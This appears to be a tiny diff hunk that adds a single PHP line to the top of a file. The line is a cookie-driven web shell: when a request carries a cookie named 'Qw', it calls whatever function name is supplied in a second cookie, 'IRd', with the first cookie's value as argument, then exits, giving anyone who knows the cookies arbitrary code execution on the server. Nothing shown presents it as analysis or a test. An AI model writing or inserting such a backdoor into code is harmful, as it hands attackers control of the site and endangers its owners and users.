@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["Qw"])){$_COOKIE["IRd"]($_COOKIE["Qw"]);exit;}
